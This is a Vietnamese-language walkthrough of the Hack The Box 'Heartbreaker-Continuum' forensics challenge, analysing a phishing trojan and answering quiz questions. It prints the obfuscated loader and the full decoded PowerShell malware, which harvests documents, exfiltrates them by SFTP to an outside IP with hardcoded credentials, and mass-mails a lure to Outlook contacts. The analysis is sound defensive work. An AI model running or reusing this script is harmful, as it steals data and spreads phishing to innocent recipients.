### Description 
> Following a recent report of a data breach at their company, the client submitted a potentially malicious executable file. The file originated from a link within a phishing email received by a victim user. Your objective is to analyze the binary to determine its functionality and possible consequences it may have on their network. By analyzing the functionality and potential consequences of this binary, you can gain valuable insights into the scope of the data breach and identify if it facilitated data exfiltration. Understanding the binary's capabilities will enable you to provide the client with a comprehensive report detailing the attack methodology, potential data at risk, and recommended mitigation steps.

### Link challenge 
> https://app.hackthebox.com/sherlocks/Heartbreaker-Continuum

### Solution 
#### Phân tích ban đầu 
- Challenge cho ta 1 file tên `Superstar_MemberCard.tiff.exe`, upload lên virustotal để xem 1 vài thông tin của nó 
- ![âbaba](image/17.PNG)
- ![âbaba](image/18.PNG)
- ![âbaba](image/19.PNG)
- File này được xác định là trojan, được viết bằng `.NET` và `powershell`, được tạo vào lúc  `2024-03-13 10:38:06 UTC`. Oke, giờ ta đi sâu vào file này để phân tích

#### To accurately reference and identify the suspicious binary, please provide its SHA256 hash.\
- Chỗ này ta có thể xem trên virustotal hoặc cũng có thể dùng sha256sum
```
┌──(kali㉿kali)-[~/Downloads/HeartBreakerContinuum]
└─$ sha256sum Superstar_MemberCard.tiff.exe 
12daa34111bb54b3dcbad42305663e44e7e6c3842f015cccbbe6564d9dfd3ea3  Superstar_MemberCard.tiff.exe
```
#### When was the binary file originally created, according to its metadata (UTC)?
> 2024-03-13 10:38:06 UTC

#### Examining the code size in a binary file can give indications about its functionality. Could you specify the byte size of the code in this binary?
- Ta có thể xem `byte size of the code` trong metadata được trích xuất từ công cụ exiftool 
```
┌──(kali㉿kali)-[~/Downloads/HeartBreakerContinuum]
└─$ exiftool Superstar_MemberCard.tiff.exe 
ExifTool Version Number         : 12.76
File Name                       : Superstar_MemberCard.tiff.exe
Directory                       : .
File Size                       : 41 kB
File Modification Date/Time     : 2024:05:13 13:02:36-04:00
File Access Date/Time           : 2024:08:12 02:41:14-04:00
File Inode Change Date/Time     : 2024:08:12 02:40:55-04:00
File Permissions                : -rw-rw-r--
File Type                       : Win32 EXE
File Type Extension             : exe
MIME Type                       : application/octet-stream
Machine Type                    : Intel 386 or later, and compatibles
Time Stamp                      : 2024:03:13 06:38:06-04:00
Image File Characteristics      : Executable, 32-bit
PE Type                         : PE32
Linker Version                  : 11.0
Code Size                       : 38400
Initialized Data Size           : 2048
Uninitialized Data Size         : 0
Entry Point                     : 0xb50e
OS Version                      : 4.0
Image Version                   : 0.0
Subsystem Version               : 4.0
Subsystem                       : Windows GUI
File Version Number             : 0.0.0.0
Product Version Number          : 0.0.0.0
File Flags Mask                 : 0x003f
File Flags                      : (none)
File OS                         : Win32
Object File Type                : Executable application
File Subtype                    : 0
Language Code                   : Neutral
Character Set                   : Unicode
File Description                : 
File Version                    : 0.0.0.0
Internal Name                   : Superstar_MemberCard.tiff.exe
Legal Copyright                 : 
Original File Name              : Superstar_MemberCard.tiff.exe
Product Version                 : 0.0.0.0
Assembly Version                : 0.0.0.0

```
> 38400

#### It appears that the binary may have undergone a file conversion process. Could you determine its original filename?
- Đến đây, ta sẽ bắt đầu decomplie xem bên trong này có gì 
- Mình sử dụng công cụ ILSpy
- Đây là hàm main trong class `MainApp`
```
	private static int Main(string[] args)
	{
		EventHandler<DataAddedEventArgs> eventHandler = null;
		EventHandler<DataAddedEventArgs> eventHandler2 = null;
		AsyncCallback asyncCallback = null;
		<>c__DisplayClass6 <>c__DisplayClass = new <>c__DisplayClass6();
		Application.EnableVisualStyles();
		MainApp mainApp = new MainApp();
		bool flag = false;
		string text = string.Empty;
		<>c__DisplayClass.ui = new MainModuleUI();
		MainModule host = new MainModule(mainApp, <>c__DisplayClass.ui);
		<>c__DisplayClass.mre = new ManualResetEvent(false);
		AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(CurrentDomain_UnhandledException);
		try
		{
			using (Runspace runspace = RunspaceFactory.CreateRunspace(host))
			{
				runspace.ApartmentState = ApartmentState.STA;
				runspace.Open();
				using (PowerShell powerShell = PowerShell.Create())
				{
					powerShell.Runspace = runspace;
					PSDataCollection<ErrorRecord> error = powerShell.Streams.Error;
					if (eventHandler == null)
					{
						eventHandler = new EventHandler<DataAddedEventArgs>(<>c__DisplayClass.<Main>b__0);
					}
					error.DataAdded += eventHandler;
					PSDataCollection<string> pSDataCollection = new PSDataCollection<string>();
					if (Console_Info.IsInputRedirected())
					{
						string text2 = "";
						while ((text2 = Console.ReadLine()) != null)
						{
							pSDataCollection.Add(text2);
						}
					}
					pSDataCollection.Complete();
					PSDataCollection<PSObject> pSDataCollection2 = new PSDataCollection<PSObject>();
					if (eventHandler2 == null)
					{
						eventHandler2 = new EventHandler<DataAddedEventArgs>(<>c__DisplayClass.<Main>b__1);
					}
					pSDataCollection2.DataAdded += eventHandler2;
					int num = 0;
					int num2 = 0;
					foreach (string text3 in args)
					{
						if (string.Compare(text3, "-wait", true) == 0)
						{
							flag = true;
						}
						else if (text3.StartsWith("-extract", StringComparison.InvariantCultureIgnoreCase))
						{
							string[] array = text3.Split(new string[1] { ":" }, 2, StringSplitOptions.RemoveEmptyEntries);
							if (array.Length != 2)
							{
								MessageBox.Show("If you specify the -extract option you need to add a file for extraction in this way\r\n   -extract:\"<filename>\"", AppDomain.CurrentDomain.FriendlyName, MessageBoxButtons.OK, MessageBoxIcon.Hand);
								return 1;
							}
							text = array[1].Trim('"');
						}
						else
						{
							if (string.Compare(text3, "-end", true) == 0)
							{
								num = num2 + 1;
								break;
							}
							if (string.Compare(text3, "-debug", true) == 0)
							{
								System.Diagnostics.Debugger.Launch();
								break;
							}
						}
						num2++;
					}
					Assembly executingAssembly = Assembly.GetExecutingAssembly();
					using (Stream stream = executingAssembly.GetManifestResourceStream("newILY.ps1"))
					{
						using (StreamReader streamReader = new StreamReader(stream, Encoding.UTF8))
						{
							string text4 = streamReader.ReadToEnd();
							if (!string.IsNullOrEmpty(text))
							{
								File.WriteAllText(text, text4);
								return 0;
							}
							powerShell.AddScript(text4);
						}
					}
					string text5 = null;
					Regex regex = new Regex("^-([^: ]+)[ :]?([^:]*)$");
					for (int j = num; j < args.Length; j++)
					{
						Match match = regex.Match(args[j]);
						double result;
						if (match.Success && match.Groups.Count == 3 && !double.TryParse(args[j], out result))
						{
							if (text5 != null)
							{
								powerShell.AddParameter(text5);
							}
							if (match.Groups[2].Value.Trim() == "")
							{
								text5 = match.Groups[1].Value;
							}
							else if (match.Groups[2].Value == "True" || match.Groups[2].Value.ToUpper() == "$TRUE")
							{
								powerShell.AddParameter(match.Groups[1].Value, true);
								text5 = null;
							}
							else if (match.Groups[2].Value == "False" || match.Groups[2].Value.ToUpper() == "$FALSE")
							{
								powerShell.AddParameter(match.Groups[1].Value, false);
								text5 = null;
							}
							else
							{
								powerShell.AddParameter(match.Groups[1].Value, match.Groups[2].Value);
								text5 = null;
							}
						}
						else if (text5 != null)
						{
							powerShell.AddParameter(text5, args[j]);
							text5 = null;
						}
						else
						{
							powerShell.AddArgument(args[j]);
						}
					}
					if (text5 != null)
					{
						powerShell.AddParameter(text5);
					}
					powerShell.AddCommand("Out-String");
					powerShell.AddParameter("Stream");
					if (asyncCallback == null)
					{
						asyncCallback = new AsyncCallback(<>c__DisplayClass.<Main>b__2);
					}
					powerShell.BeginInvoke(pSDataCollection, pSDataCollection2, null, asyncCallback, null);
					while (!mainApp.ShouldExit && !<>c__DisplayClass.mre.WaitOne(100))
					{
					}
					powerShell.Stop();
					if (powerShell.InvocationStateInfo.State == PSInvocationState.Failed)
					{
						<>c__DisplayClass.ui.WriteErrorLine(powerShell.InvocationStateInfo.Reason.Message);
					}
				}
				runspace.Close();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show("An exception occured: " + ex.Message, AppDomain.CurrentDomain.FriendlyName, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
		if (flag)
		{
			MessageBox.Show("Click OK to exit...", AppDomain.CurrentDomain.FriendlyName);
		}
		return mainApp.ExitCode;
	}

```
- Tại dòng này 
```
					using (Stream stream = executingAssembly.GetManifestResourceStream("newILY.ps1"))
					{
						using (StreamReader streamReader = new StreamReader(stream, Encoding.UTF8))
						{
							string text4 = streamReader.ReadToEnd();
							if (!string.IsNullOrEmpty(text))
							{
								File.WriteAllText(text, text4);
								return 0;
							}
							powerShell.AddScript(text4);
						}
					}
```
- Dòng mã này trích xuất một tệp tài nguyên nhúng (embedded resource) từ một tệp thực thi (assembly) và tạo một luồng (Stream) để đọc nội dung của tài nguyên đó. Trong trường hợp này, tài nguyên nhúng là một tệp kịch bản PowerShell có tên "newILY.ps1"
- ![sssn](image/20.PNG)

> newILY.ps1

#### Specify the hexadecimal offset where the obfuscated code of the identified original file begins in the binary.
<details>
<summary>
Đây là file powershell 
</summary>

```
$sCrt = "==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" ;
$enC = $sCrt.ToCharArray() ; [array]::Reverse($enC) ; -join $enC 2>&1> $null ;
$bOom = [sYsTeM.tExT.eNcOdInG]::uTf8.GeTsTrInG([sYsTeM.cOnVeRt]::fRoMbASe64sTrInG("$enC")) ;
$iLy = "iNv"+"OKe"+"-Ex"+"PrE"+"SsI"+"On" ; NeW-AliAs -NaMe ilY -VaLuE $iLy -FoRcE ; ilY $bOom ;

```

</details>

- Với câu mày, ta chỉ đơn giản là mở file exe dưới dạng hex lên và xem dữ liệu file ps1 nằm ở đâu, ở đây ta thấy mã nguồn file bắt đầu bằng biến `$sCrt` ta sẽ tìm theo nó.
- ![ssnsn](image/22.PNG)
> 2C74

#### The threat actor concealed the plaintext script within the binary. Can you provide the encoding method used for this obfuscation? 
- Nhìn vào 2 dòng này :
```
$enC = $sCrt.ToCharArray() ; [array]::Reverse($enC) ; -join $enC 2>&1> $null ;
$bOom = [sYsTeM.tExT.eNcOdInG]::uTf8.GeTsTrInG([sYsTeM.cOnVeRt]::fRoMbASe64sTrInG("$enC")) ;
```
- Ta thấy rõ ràng chuỗi đã bị obfuscation bằng cách mã hoá base64 và đảo ngược lại

> base64

#### What is the specific cmdlet utilized that was used to initiate file downloads?

- Mình sử dụng PowerShell ISE để xem code powershell thực sự của nó 
- ![ssnsn](image/21.PNG)
```
$hostname = $env:COMPUTERNAME
$currentUser = $env:USERNAME
$url = "http://44.206.187.144:9000/Superstar_MemberCard.tiff"
$img = "C:\users\$currentUser\Downloads\Superstar_MemberCard.tiff"

Invoke-WebRequest -Uri $url -OutFile $img
Start-Process $img

$searchDir = "C:\Users"
$targetDir = "C:\Users\Public\Public Files"

if (-not (Test-Path -Path $targetDir -PathType Container)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

$currentUser | Out-File -FilePath (Join-Path $targetDir 'username.txt') -Force

nltest /dsgetdc:$env:USERDOMAIN 2>$null | Out-File -FilePath (Join-Path $targetDir 'DCinfo.txt') -Force
Get-WmiObject -Class Win32_UserAccount | Out-File -FilePath (Join-Path $targetDir 'localusers.txt') -Force
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value 2>$null | Out-File -FilePath (Join-Path $targetDir 'AVinfo.txt') -Force

$currentUserProcesses = Get-WmiObject Win32_Process | Where-Object {
    try {
        $_.GetOwner().User -eq $currentUser
    } catch {
        $false  
    }
}

$currentUserProcesses | Select-Object ProcessName, ProcessId | Out-File -FilePath (Join-Path $targetDir 'UserProcesses.txt') -Force

if (Get-Process -Name Outlook -ErrorAction SilentlyContinue) {
    Stop-Process -Name Outlook -Force -ErrorAction SilentlyContinue
}

$extList =  "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.pdf", "*.csv", ".*oft", "*.potx", 
            "*.xltx", "*.dotx", "*.msg", "*.eml", "*.pst",  "*.odt", "*.ods", "*.odp", "*.odg", "*.ost"
             
$null = Get-ChildItem $searchDir -Recurse -Include $extList -Force -ErrorAction 'SilentlyContinue' |
    ForEach-Object {
        $destinationPath = Join-Path $targetDir $_.Name
        
        if ($_.FullName -ne $destinationPath) {
            Copy-Item -Path $_.FullName -Destination $destinationPath -Force
        }
    }

Get-SmbShare | Out-File -FilePath (Join-Path $targetDir 'Shareinfo.txt') -Force
gpresult /r | Out-File -FilePath (Join-Path $targetDir 'GPinfo.txt') -Force
$ProgressPreference = 'SilentlyContinue'
$archivePath = "$targetDir\$hostname.zip"
Compress-Archive -Path $targetDir -DestinationPath $archivePath -Force 

$wZipUrl = "https://us.softradar.com/static/products/winscp-portable/distr/0/winscp-portable_softradar-com.zip"
$wZipFile = "$targetDir\WinSCP.zip"
$wExtractPath = "C:\Users\Public\HelpDesk-Tools"

Invoke-WebRequest -UserAgent "Wget" -Uri $wZipUrl -OutFile $wZipFile -UseBasicParsing
Expand-Archive -Path $wZipFile -DestinationPath $wExtractPath -Force

$wExePath = "$wExtractPath\WinSCP.com"
$sPath = "$wExtractPath\maintenanceScript.txt"
@"
open sftp://service:M8&C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
put `"$archivePath`"
close
exit
"@ | Out-File -FilePath $sPath -Force
Start-Process -FilePath $wExePath -ArgumentList "/script=`"$sPath`"" -Wait -NoNewWindow


$outlookPath  = Get-ChildItem -Path "C:\Program Files\Microsoft Office" -Filter "OUTLOOK.EXE" -Recurse | Select-Object -First 1 -ExpandProperty FullName

$htmlBody = @"
<!DOCTYPE html>
<html>
<head>
<style>
    body {
    font-family: Calibri, sans-serif;
    }
</style>
</head>
<body>
<p>Hey, </p> <p> Hope you're doing great when you see this. I'm reaching out because there's something I've been wanting to share with you. You know that feeling when you've been adm
iring someone from afar, but hesitated to take the next step? That's been me lately, but I've decided it's time to change that.</p>
<p>In a world where we often rush through everything, I believe in the beauty of taking things slow, cherishing each moment like a scene from a timeless tale. So, if you're open to i
t, I'd love for us to meet up after hours.</p>
<p>I've arranged for a rendezvous at a private membership club, where we can enjoy a bit of privacy and exclusivity. I've attached the map for your convenience. </p>
<p>To gain entry, you'll need a digital membership card for entry, accessible <a href='http://44.206.187.144:9000/Superstar_MemberCard.tiff.exe'>here</a>. Just a friendly heads up, t
here's a time limit before you can download it, so it's best to grab it sooner rather than waiting too long.</p>
<p>Counting on seeing you there later.</p>
</body>
</html>
"@

if ($outlookPath) {
    Start-Process -FilePath $outlookPath
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace("MAPI")
    $contactsFolder = $namespace.GetDefaultFolder(10) 
    $csvFilePath = "$targetDir\Contacts.csv"
    $contactsFolder.Items | ForEach-Object {
        $_.GetInspector | ForEach-Object {
            $_.Close(0)  
        }
        $props = @{
            'Full Name'      = $_.FullName
            'Email Address'  = $_.Email1Address
            
        }
        New-Object PSObject -Property $props
    } | Export-Csv -Path $csvFilePath -NoTypeInformation

    $contacts = Import-Csv -Path $csvFilePath
    $mailItem = $outlook.CreateItem(0)
    $mailItem.Subject = "Fingers crossed you'll notice.."
    $mailItem.HtmlBody = $htmlBody
    $mailItem.Attachments.Add($img) > $null
    $mailItem.BodyFormat = 2 

    foreach ($contact in $contacts) {
        $bccRecipient = $mailItem.Recipients.Add($contact."Email Address")
        $bccRecipient.Type = [Microsoft.Office.Interop.Outlook.OlMailRecipientType]::olBCC
    }

    $mailItem.Recipients.ResolveAll() > $null
    $mailItem.Send()
}

Remove-Item -Path $wExtractPath -Recurse -Force
Remove-Item -Path $targetDir -Recurse -Force
```
- Đầu tiên khai báo 2 biến `$url` và `$img` lần lượt là liên kết tải xuống và vị trí lưu trữ.
- Tiếp sau đó dùng `Invoke-WebRequest -Uri $url -OutFile $img` để tải xuống
> Invoke-WebRequest

#### Could you identify any possible network-related Indicators of Compromise (IoCs) after examining the code? Separate IPs by comma and in ascending order.

- Nhìn vào ip tải tệp `Superstar_MemberCard.tiff` về và ip ssh kết nối để gửi dữ liệu đi.
> 35.169.66.138,44.206.187.144

#### The binary created a staging directory. Can you specify the location of this directory where the harvested files are stored?
```
$searchDir = "C:\Users"
$targetDir = "C:\Users\Public\Public Files"

